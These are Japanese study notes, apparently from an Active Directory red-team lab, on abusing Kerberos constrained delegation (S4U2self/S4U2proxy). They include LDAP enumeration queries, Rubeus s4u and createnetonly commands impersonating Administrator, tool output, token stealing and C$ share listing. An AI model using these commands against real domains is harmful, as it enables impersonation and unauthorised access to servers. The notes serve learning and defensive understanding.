Unconstrained Delegationの問題を解消するためにServer2003で導入。
Kerberos委任の仕組みでS4U(Service For User)という拡張プロトコルで実装

### S4U の2つのサブプロトコル

| プロトコル         | 用途                                                                    |
| ------------- | --------------------------------------------------------------------- |
| **S4U2self**  | サービスが「ユーザーの代わりに」自分自身へのサービスチケットを取得する。ユーザーがKerberos以外（NTLMなど）で認証した場合に使用 |
| **S4U2proxy** | サービスが「ユーザーの代わりに」別のバックエンドサービスへのサービスチケットを取得する。いわゆる「制約付き委任」本体            |
### S4U2proxy流れ

```
① クライアント → KDC
   「フロントエンドサービスのチケットをください」（TGS-REQ）

② KDC → クライアント
   「はい、どうぞ」（TGS-REP）

③ クライアント → フロントエンドサービス
   「このチケットで認証します」（AP-REQ）
   ※フロントエンドはこのチケットをメモリにキャッシュしておく

④ フロントエンドサービス → KDC
   「バックエンドサービスのチケットをください」（TGS-REQ）
   「ユーザーのキャッシュ済みチケットも添付します」

⑤ KDC が確認する
   「このフロントエンドの msDS-AllowedToDelegateTo属性 に
    バックエンドのSPNが含まれているか？」
   → YES なら チケット発行

⑥ フロントエンドサービス → バックエンドサービス
   「ユーザーの代わりに認証します」
```

### 設定の識別方法
```
# 委任が設定されているコンピュータの列挙
ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*))
           --attributes samAccountName,msDS-AllowedToDelegateTo

# 例: LON-WS-1$ は cifs/lon-fs-1 へのみ委任可能
```

### Protocol Transition
S4U2selfを使って、**サービス自身が「ユーザーのチケット」を自分で作り出す**ことができます。
```
1. フロントエンドサービスがKDCに対してTGS-REQを送る
   └ SPN = 自分自身のSamAccountName（例: lon-ws-1$）
   └ ユーザー名 = 認証してきたユーザー（例: dyork）

2. KDCがTGS-REP（サービスチケット）を返す
   └ これがS4U2self

3. そのチケットをS4U2proxyに使い、バックエンドのチケットを取得
```
つまり**認証プロトコルをNTLM→Kerberosに「遷移」させる**ことからProtocol Transition
### 有効化の条件
> [!NOTE]
> **Protocol TransitionはデフォルトでOFF**

LDAPのUAC属性に`TRUSTED_TO_AUTH_FOR_DELEGATION`フラグを明示的に立てる必要があります。
```powershell
# フラグが立っているか確認
[System.Convert]::ToBoolean(16781312 -band 16777216)
# → True = Protocol Transition 有効
```

```
ldapsearch(&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl
```

![[images/Pasted image 20260502152410.png]]

# Attacking S4U
## ケース1: Protocol Transitionあり
```
攻撃者 → コンピュータアカウントのTGT取得
        → S4U2self: 任意ユーザー名でサービスチケット要求（forwardable）
        → S4U2proxy: バックエンドサービスのチケット取得
        → バックエンドサービスに任意ユーザーとしてアクセス
```

Rubeusを使用した実行例
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:cifs/lon-fs-1 /ticket:doIFn[...snip...]5DT00= /impersonateuser:Administrator /nowrap
```
パラメータ説明
```
/user:lon-ws-1$ ← 委任設定されたコンピュータ
/msdsspn:cifs/lon-fs-1 ← 委任先SPN
/ticket:<TGT> ← コンピュータアカウントのTGT
/impersonateuser:Administrator ← なりすましたいユーザー
```

kb_s4uを使用する例：
```
krb_s4u /ticket:[TGT] /service:cifs/lon-fs-1 /impersonateuser:Administrator
```

RubeusがS4U2selfでアクセスしてる様子
```
[*] Action: S4U

[*] Building S4U2self request for: 'LON-WS-1$@CONTOSO.COM'
[*] Using domain controller: lon-dc-1.contoso.com (10.10.120.1)
[*] Sending S4U2self request to 10.10.120.1:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'LON-WS-1$@CONTOSO.COM'
[*] base64(ticket.kirbi):

      doIF8[...snip...]MtMSQ=
```

describeに渡してチケットの中身を覗くとなりすましと転送フラグが立っていることが分かる
```powershell
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /ticket:doIF8[...snip...]MtMSQ=
```

![[images/Pasted image 20260502133528.png]]

Rubeusは上記チケットを受け取って/msdsspnパラメータで指定されたサービスにS4U2Proxyリクエストを送信する。
```
[*] Impersonating user 'Administrator' to target SPN 'cifs/lon-fs-1'
[*] Building S4U2proxy request for service: 'cifs/lon-fs-1'
[*] Using domain controller: lon-dc-1.contoso.com (10.10.120.1)
[*] Sending S4U2proxy request to domain controller 10.10.120.1:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/lon-fs-1':

      doIGf[...snip...]ZzLTE=
```

これはCIFSのサービスチケットなので、これを使ってコンピュータのCドライブを一覧表示可能
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:doIGf[...snip...]ZzLTE=
```
> [!NOTE]
> createnetonlyコマンドは偽のログオンセッションを作成して、そこにチケットを注入する操作（LOGONTYPE=9)はチケットで認証行うので、パスワードは適当でいい。


## ケース2: Protocol Transitionなし
S4U2selfは行われるが、fowardableフラグが立っていないので、S4U2Proxyが失敗する
![[images/Pasted image 20260502134821.png]]

失敗
```
[*] Impersonating user 'Administrator' to target SPN 'cifs/lon-fs-1'
[*] Building S4U2proxy request for service: 'cifs/lon-fs-1'
[*] Using domain controller: lon-dc-1.contoso.com (10.10.120.1)
[*] Sending S4U2proxy request to domain controller 10.10.120.1:88

[X] KRB-ERROR (13) : KDC_ERR_BADOPTION
```

ユーザはフロントエンドサービスへの既存のサービスチケットを入手する必要がある。
なりすませるユーザはチケットが入手できたユーザのみ

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:cifs/lon-fs-1 /ticket:doIFn[...snip...]5DT00= /tgs:doIFp[...snip...]dzLTE= /nowrap
```
パラメータ説明
```
/user:lon-ws-1$ ← 委任設定されたコンピュータ
/msdsspn:cifs/lon-fs-1 ← 委任先SPN
/ticket:<TGT> ← コンピュータアカウントのTGT
/tgs:<TGS> ← ユーザーに対して取得されたフロントエンドサービスチケット
```

このチケットを使用すると、lon-fs-1 上の CIFS サービスに dyork としてアクセス
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:dyork /password:FakePass /ticket:doIGL[...snip...]mcy0x

出力例：
[*] Using CONTOSO.COM\dyork:FakePass

[*] Showing process : False
[*] Username        : dyork
[*] Domain          : CONTOSO.COM
[*] Password        : FakePass
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 2548
[+] Ticket successfully imported!
[+] LUID            : 0x9bb752
```

プロセスのトークンを窃取する
```
steal_token 2548
```

委任先SPNのcドライブを列挙
```
ls \\lon-fs-1\c$
```
